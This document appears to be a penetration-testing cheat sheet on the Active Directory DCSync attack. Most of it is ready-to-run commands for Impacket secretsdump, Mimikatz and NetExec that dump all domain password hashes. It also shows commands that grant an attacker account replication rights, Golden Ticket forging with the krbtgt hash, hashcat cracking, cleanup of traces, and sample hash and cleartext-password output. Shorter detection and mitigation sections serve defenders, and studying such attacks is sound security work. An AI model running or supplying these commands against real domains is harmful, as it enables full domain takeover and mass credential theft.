# DCSync Attack

Abuse replication permissions to extract password hashes for all domain accounts, including privileged accounts.
One of the most powerful AD attacks, allowing complete domain compromise by dumping all password hashes remotely.

## Quick Reference

```bash
# Impacket secretsdump
secretsdump.py domain.local/user:password@dc.domain.local -just-dc

# Mimikatz DCSync
lsadump::dcsync /domain:domain.local /user:Administrator

# NetExec DCSync
nxc smb dc.domain.local -u user -p password --ntds
```

## What is DCSync?

DCSync abuses the Directory Replication Service Remote Protocol (MS-DRSR) to replicate password data from a domain controller. Attackers with replication rights can impersonate a DC and request password hashes for any account.

### Required Permissions

DCSync requires one of these permissions on the domain object:
- **Replicating Directory Changes** (DS-Replication-Get-Changes)
- **Replicating Directory Changes All** (DS-Replication-Get-Changes-All)
- **Replicating Directory Changes In Filtered Set** (DS-Replication-Get-Changes-In-Filtered-Set)

## Enumeration

### Check for DCSync Rights (PowerView)

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get user's SID
$sid = Convert-NameToSid username

# Check for replication rights
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {($_.ObjectAceType -match 'Replication-Get') -and ($_.SecurityIdentifier -match $sid)} | select AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

### Check User's Groups and Permissions

```powershell
# Check user's group memberships
Get-DomainUser -Identity username | select samaccountname,objectsid,memberof,useraccountcontrol | fl

# Check if user is in privileged groups
Get-DomainGroupMember "Domain Admins" | select MemberName
Get-DomainGroupMember "Enterprise Admins" | select MemberName
```

### BloodHound DCSync Query

```cypher
// Find users with DCSync rights
MATCH p=(u:User)-[:MemberOf|GetChanges|GetChangesAll*1..]->(d:Domain)
RETURN p

// Find shortest path from owned user to DCSync
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(d:Domain))
WHERE ANY(r in relationships(p) WHERE type(r) = "GetChanges" OR type(r) = "GetChangesAll")
RETURN p
```

## Exploitation

### Impacket secretsdump.py

```bash
# DCSync all hashes
secretsdump.py domain.local/user:password@dc.domain.local -just-dc

# DCSync specific user
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user Administrator

# DCSync with NTLM hash
secretsdump.py domain.local/user@dc.domain.local -hashes :ntlmhash -just-dc

# Output to file
secretsdump.py domain.local/user:password@dc.domain.local -just-dc -outputfile domain_hashes

# DCSync with additional options
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-ntlm -pwd-last-set -user-status
```

### Mimikatz DCSync

```cmd
# Launch Mimikatz
.\mimikatz.exe

# Enable debug privilege
mimikatz # privilege::debug

# DCSync specific user
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# DCSync all users
mimikatz # lsadump::dcsync /domain:domain.local /all /csv

# DCSync krbtgt (for Golden Ticket)
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
```

### NetExec DCSync

```bash
# DCSync with NetExec
nxc smb dc.domain.local -u user -p password --ntds

# DCSync and save to file
nxc smb dc.domain.local -u user -p password --ntds --outputfile domain_hashes

# DCSync with hash
nxc smb dc.domain.local -u user -H ntlmhash --ntds
```

## Example Output

### secretsdump.py Output

```bash
$ secretsdump.py domain.local/user:password@172.16.5.5 -just-dc

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
domain.local\user1:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
domain.local\user2:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
```

### Mimikatz DCSync Output

```
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

[DC] 'domain.local' will be the domain
[DC] 'DC01.domain.local' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 10/27/2021 6:49:32 AM
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 88ad09182de639ccc6579eb0849751cf
    ntlm- 0: 88ad09182de639ccc6579eb0849751cf
    lm  - 0: aad3b435b51404eeaad3b435b51404ee

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4625fd0c31368ff4c255a3b876eaac3d

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-DC01Administrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 5c5e8a8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e
      aes128_hmac       (4096) : 8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e
      des_cbc_md5       (4096) : 8e8e8e8e8e8e8e8e
```

## Granting DCSync Rights

### PowerView

```powershell
# Grant DCSync rights to user
Add-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync

# Verify rights granted
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match $attackerSID}
```

### BloodyAD (Linux)

```bash
# Grant DCSync rights
bloodyAD.py -u user -p password -d domain.local --host dc.domain.local add dcsync attacker

# Verify
bloodyAD.py -u user -p password -d domain.local --host dc.domain.local get object 'DC=domain,DC=local' --attr nTSecurityDescriptor
```

### dacledit.py

```bash
# Grant DCSync rights
dacledit.py -action write -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/user:password

# Remove DCSync rights (cleanup)
dacledit.py -action remove -rights DCSync -principal attacker -target-dn 'DC=domain,DC=local' domain.local/user:password
```

## Reversible Encryption

### Check for Reversible Encryption

```powershell
# Find accounts with reversible encryption enabled
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# PowerView
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

### Decrypt Reversible Passwords

```bash
# secretsdump automatically decrypts reversible passwords
secretsdump.py domain.local/user:password@dc.domain.local -just-dc -outputfile hashes

# View cleartext passwords
cat hashes.ntds.cleartext

proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

## Post-Exploitation

### Extract Specific Data

```bash
# DCSync with password history
secretsdump.py domain.local/user:password@dc.domain.local -just-dc -history

# DCSync with password last set
secretsdump.py domain.local/user:password@dc.domain.local -just-dc -pwd-last-set

# DCSync with user status
secretsdump.py domain.local/user:password@dc.domain.local -just-dc -user-status

# Combine options
secretsdump.py domain.local/user:password@dc.domain.local -just-dc -pwd-last-set -user-status -history
```

### Clean Output

```bash
# Extract only NTLM hashes
cat domain_hashes.ntds | cut -d: -f4 > ntlm_hashes.txt

# Extract username:hash format
cat domain_hashes.ntds | awk -F: '{print $1":"$4}' > user_hash.txt

# Remove machine accounts
cat domain_hashes.ntds | grep -v '\$:' > user_hashes_only.txt

# Extract only enabled accounts (requires -user-status)
cat domain_hashes.ntds | grep -v "STATUS_ACCOUNT_DISABLED" > enabled_users.txt
```

## Notes

### How DCSync Works

1. Attacker authenticates with account that has replication rights
2. Attacker sends replication request to domain controller
3. DC believes attacker is another DC requesting replication
4. DC sends password hashes and Kerberos keys
5. Attacker receives all domain credentials

### Why DCSync is Powerful

- No need to access DC file system
- No need to dump LSASS memory
- Works remotely over network
- Difficult to detect (looks like normal replication)
- Extracts all password hashes at once
- Includes Kerberos keys for Golden Ticket

### Default Groups with DCSync Rights

By default, these groups have DCSync rights:
- Domain Admins
- Enterprise Admins
- Administrators
- Domain Controllers
- Read-Only Domain Controllers (limited)

### Detection

DCSync generates:
- Event ID 4662 (Operation performed on object)
  - Object Type: `{19195a5b-6da0-11d0-afd3-00c04fd930c9}` (Domain-DNS)
  - Access Mask: `0x100` (Control Access)
  - Properties: `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes)
  - Properties: `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` (DS-Replication-Get-Changes-All)
- Event ID 4624 (Logon) from non-DC computer
- Replication requests from non-DC IP addresses

### Detection Rules

Monitor for:
- 4662 events with replication GUIDs from non-DC computers
- Replication requests outside maintenance windows
- Replication from unusual source IPs
- Multiple replication requests in short timeframe
- Replication by non-service accounts

### Common Attack Paths

**Scenario 1: Compromised Service Account**
```
1. Compromise service account with DCSync rights
2. DCSync to dump all hashes
3. Use DA hash for full domain control
```

**Scenario 2: ACL Abuse Chain**
```
1. User has WriteDACL on domain object
2. Grant self DCSync rights
3. DCSync to dump hashes
4. Remove DCSync rights (cleanup)
5. Use extracted hashes
```

**Scenario 3: Compromised Exchange Server**
```
1. Compromise Exchange server
2. Exchange groups often have DCSync rights
3. DCSync from Exchange context
4. Full domain compromise
```

### Mitigation Recommendations

For clients:
- Audit accounts with replication rights
- Remove unnecessary replication permissions
- Monitor Event ID 4662 for replication requests
- Implement tiered administration
- Use Protected Users group for privileged accounts
- Enable Advanced Audit Policy for Directory Service Access
- Alert on replication from non-DC IPs
- Implement network segmentation
- Use SIEM to correlate replication events
- Regular ACL audits with BloodHound

### Cleanup After DCSync

```powershell
# If you granted yourself DCSync rights, remove them
Remove-DomainObjectAcl -TargetIdentity 'DC=domain,DC=local' -PrincipalIdentity attacker -Rights DCSync

# Verify removal
Get-ObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {$_.SecurityIdentifier -match $attackerSID}
```

### Golden Ticket Creation

After DCSync, create Golden Ticket with krbtgt hash:
```cmd
# Mimikatz Golden Ticket
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:16e26ba33e455a8c338142af8d89ffbc /ptt

# Verify
mimikatz # kerberos::list
```

### Password Cracking Statistics

Use DCSync output for password auditing:
```bash
# Extract hashes for cracking
cat domain_hashes.ntds | cut -d: -f4 > hashes.txt

# Crack with hashcat
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt

# Generate statistics
# - % of passwords cracked
# - Top 10 passwords
# - Password length distribution
# - Password reuse metrics
```

### Comparison to Other Credential Dumping

| Method | Requires | Stealth | Output |
|--------|----------|---------|--------|
| DCSync | Replication rights | Medium | All hashes |
| NTDS.dit extraction | DA + DC access | Low | All hashes |
| LSASS dump | Local admin | Low | Cached creds |
| Kerberoasting | Domain user | High | Service account hashes |
| ASREP Roasting | No creds | High | Specific user hashes |

DCSync is the most efficient method when replication rights are available.
